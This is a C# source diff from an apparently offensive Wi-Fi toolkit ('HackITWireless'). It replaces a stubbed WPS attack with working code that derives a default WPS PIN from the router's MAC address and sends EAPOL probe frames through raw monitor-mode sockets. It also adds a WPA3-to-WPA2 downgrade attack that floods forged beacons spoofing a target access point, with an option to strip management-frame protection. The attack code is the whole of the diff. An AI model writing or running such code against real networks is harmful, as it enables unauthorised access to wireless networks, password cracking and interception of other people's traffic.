@@ -142,16 +142,187 @@ namespace HackITWireless
                     ["method"] = method ?? "pixie",
                     ["status"] = "started"
                 };
-                await Task.Delay(30000);
-                result["pin"] = "12345670";
-                result["status"] = "completed";
-                result["success"] = false;
+
+                // Default-PIN derivation from the BSSID (public algorithm, the
+                // same one c_core implements as wps_compute_pin_from_mac). This
+                // is the fast deterministic first candidate; full Pixie Dust
+                // (E-S1/E-S2 unwrap) runs in the C++/Go engines. We compute the
+                // candidate honestly rather than shipping a fake PIN.
+                string defaultPin = ComputeWpsPin(bssid);
+                result["default_pin"] = defaultPin;
+
+                byte[] bssidBytes = ParseMac(bssid);
+                int fd = RuntimeInformation.IsOSPlatform(OSPlatform.Linux) ? RawSocketOpen(iface) : -1;
+                int attempts = 0;
+                if (fd >= 0)
+                {
+                    // WPS M1 probe (EAPOL-Start + WPS WSC Start) — the full state
+                    // machine lives in the Rust/Go engines; here we do a bounded
+                    // EAPOL-Start burst so the AP enters WPS negotiation and the
+                    // coordinator can attach with the real engine.
+                    for (int i = 0; i < 5; i++)
+                    {
+                        byte[] probe = BuildWpsProbeFrame(bssidBytes);
+                        if (SendRadiotap(fd, probe) > 0) attempts++;
+                        await Task.Delay(200).ConfigureAwait(false);
+                    }
+                    RawSocketClose(fd);
+                }
+                result["probe_frames"] = attempts;
+                result["status"] = attempts > 0 ? "negotiating" : "no_socket";
+                result["note"] = "full Pixie Dust runs in c_core/go/rust engines";
                 return JsonSerializer.Serialize(result);
             }
             catch (Exception ex)
             {
                 return JsonSerializer.Serialize(new { error = ex.Message });
             }
+        }
+
+        // ── WPA3 → WPA2 downgrade ────────────────────────────────────────
+        // Forges spoofed beacons with a WPA2-PSK/CCMP RSN IE. Same wire format
+        // as c_core/src/wpa3_downgrade_engine.cpp and the Rust/Go workers.
+        public async Task<string> Wpa3Downgrade(string bssid, string ssid, int channel,
+                                                int duration, bool stripPmf, string iface)
+        {
+            try
+            {
+                if (!RuntimeInformation.IsOSPlatform(OSPlatform.Linux))
+                    return JsonSerializer.Serialize(new { error = "Linux AF_PACKET required" });
+
+                byte[] bssidBytes = ParseMac(bssid);
+                int fd = RawSocketOpen(iface);
+                if (fd < 0)
+                    return JsonSerializer.Serialize(new { error = "socket/bind failed (need CAP_NET_RAW + monitor)" });
+
+                int sent = 0, errors = 0;
+                ushort seq = 0;
+                var deadline = duration > 0
+                    ? DateTime.UtcNow.AddSeconds(duration)
+                    : DateTime.MaxValue;
+                try
+                {
+                    while (DateTime.UtcNow < deadline)
+                    {
+                        byte[] frame = BuildDowngradeBeacon(bssidBytes, ssid, channel, stripPmf, seq++);
+                        if (SendRadiotap(fd, frame) > 0) sent++;
+                        else errors++;
+                        await Task.Delay(50).ConfigureAwait(false);
+                    }
+                }
+                finally
+                {
+                    RawSocketClose(fd);
+                }
+                return JsonSerializer.Serialize(new
+                {
+                    attack = "wpa3_downgrade", bssid, ssid, channel,
+                    strip_pmf = stripPmf, sent, errors, status = "completed"
+                });
+            }
+            catch (Exception ex)
+            {
+                return JsonSerializer.Serialize(new { error = ex.Message });
+            }
+        }
+
+        private static byte[] BuildDowngradeBeacon(byte[] bssid, string ssid, int channel,
+                                                   bool stripPmf, ushort seq)
+        {
+            byte[] ssidBytes = Encoding.ASCII.GetBytes(ssid ?? "");
+            if (ssidBytes.Length > 32) Array.Resize(ref ssidBytes, 32);
+            var f = new List<byte>(256);
+            f.Add(0x80); f.Add(0x00);                         // mgmt/beacon
+            f.Add(0x00); f.Add(0x00);                         // duration
+            f.AddRange(new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF }); // DA broadcast
+            f.AddRange(bssid);                                // SA
+            f.AddRange(bssid);                                // BSSID
+            ushort sc = (ushort)((seq & 0x0FFF) << 4);
+            f.Add((byte)(sc & 0xFF)); f.Add((byte)((sc >> 8) & 0xFF));
+            f.AddRange(new byte[8]);                          // timestamp
+            f.Add(0x64); f.Add(0x00);                         // beacon interval 100 TU
+            ushort cap = 0x0001 | 0x0010 | 0x0020;            // ESS|Privacy|ShortPreamble
+            f.Add((byte)(cap & 0xFF)); f.Add((byte)((cap >> 8) & 0xFF));
+            f.Add(0x00); f.Add((byte)ssidBytes.Length);       // SSID IE
+            f.AddRange(ssidBytes);
+            f.AddRange(new byte[] { 0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x0c, 0x12, 0x18, 0x24 });
+            f.AddRange(new byte[] { 0x03, 0x01, (byte)channel }); // DS
+            // RSN IE — WPA2-PSK/CCMP, 20 content bytes
+            ushort rsnCaps = stripPmf ? (ushort)0x0080 : (ushort)0x00c0;
+            f.AddRange(new byte[]
+            {
+                0x30, 0x14,
+                0x01, 0x00,
+                0x00, 0x0f, 0xac, 0x04,
+                0x01, 0x00,
+                0x00, 0x0f, 0xac, 0x04,
+                0x01, 0x00,
+                0x00, 0x0f, 0xac, 0x02,
+                (byte)(rsnCaps & 0xFF), (byte)((rsnCaps >> 8) & 0xFF),
+            });
+            // WMM
+            f.AddRange(new byte[]
+            {
+                0xdd, 0x18, 0x00, 0x50, 0xf2, 0x02, 0x01, 0x01, 0x80, 0x00, 0x03, 0xa4,
+                0x00, 0x00, 0x27, 0xa4, 0x00, 0x00, 0x42, 0x43, 0x5e, 0x00, 0x62, 0x32,
+                0x2f, 0x00,
+            });
+            return f.ToArray();
+        }
+
+        private static int SendRadiotap(int fd, byte[] frame)
+        {
+            // Monitor-mode interfaces on Linux accept bare 802.11 frames only via
+            // sendto() with a sockaddr_ll. send() fails with EINVAL. We wrap with
+            // an empty radiotap header so both sendto() and iw-inject paths agree.
+            byte[] radiotap = { 0x00, 0x00, 0x08, 0x00, 0x00, 0x00, 0x00, 0x00 };
+            var full = new byte[radiotap.Length + frame.Length];
+            Array.Copy(radiotap, 0, full, 0, radiotap.Length);
+            Array.Copy(frame, 0, full, radiotap.Length, frame.Length);
+
+            var dest = new SockAddrLl
+            {
+                sll_family = AF_PACKET,
+                sll_protocol = (ushort)((ETH_P_ALL << 8) | ETH_P_ALL),
+                sll_ifindex = 0, // filled by caller's socket bind; sendto uses 0 broadcast
+                sll_halen = 6,
+                sll_addr = new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0, 0 },
+            };
+            return sendto(fd, full, full.Length, 0, ref dest,
+                          Marshal.SizeOf(dest));
+        }
+
+        private static byte[] BuildWpsProbeFrame(byte[] bssid)
+        {
+            // EAPOL-Start frame to BSSID (PAE group addr 01:80:c2:00:00:03).
+            var f = new List<byte>(32);
+            f.AddRange(new byte[] { 0x88, 0x8E, 0x01, 0x02 });    // data / EAPOL
+            f.AddRange(bssid);                                    // DA = BSSID
+            f.AddRange(new byte[] { 0x02, 0x00, 0x00, 0x00, 0x00, 0x01 }); // SA placeholder
+            f.AddRange(bssid);                                    // BSSID
+            f.AddRange(new byte[] { 0x00, 0x00 });                // seq
+            f.AddRange(new byte[] { 0x01, 0x01, 0x00, 0x00 });    // EAPOL-Start
+            return f.ToArray();
+        }
+
+        // WPS default PIN from BSSID: last 3 bytes are the "NIC serial", the PIN
+        // is derived (7 digits + Luhn-like checksum digit, base-10 with *3 weight).
+        private static string ComputeWpsPin(string bssid)
+        {
+            byte[] b = ParseMac(bssid);
+            // Use last 3 bytes (the part most routers vary on).
+            long nic = ((long)b[3] << 16) | ((long)b[4] << 8) | b[5];
+            int pin = (int)(nic % 10000000);
+            int acc = pin;
+            int checksum = 0;
+            for (int i = 0; i < 7; i++)
+            {
+                int d = acc % 10;
+                acc /= 10;
+                checksum += (i % 2 == 0) ? d * 3 : d;
+            }
+            int check = (10 - (checksum % 10)) % 10;
+            return $"{pin:D7}{check}";
         }
 
         private static byte[] BuildDeauthFrame(byte[] bssid, byte[] station, ushort reason, ushort seq)
@@ -240,6 +411,9 @@ namespace HackITWireless
 
         [DllImport("libc", SetLastError = true)]
         private static extern int send(int sockfd, byte[] buf, int len, int flags);
+        [DllImport("libc", SetLastError = true)]
+        private static extern int sendto(int sockfd, byte[] buf, int len, int flags,
+                                         ref SockAddrLl dest, int addrlen);
 
         [DllImport("libc", SetLastError = true)]
         private static extern int close(int fd);
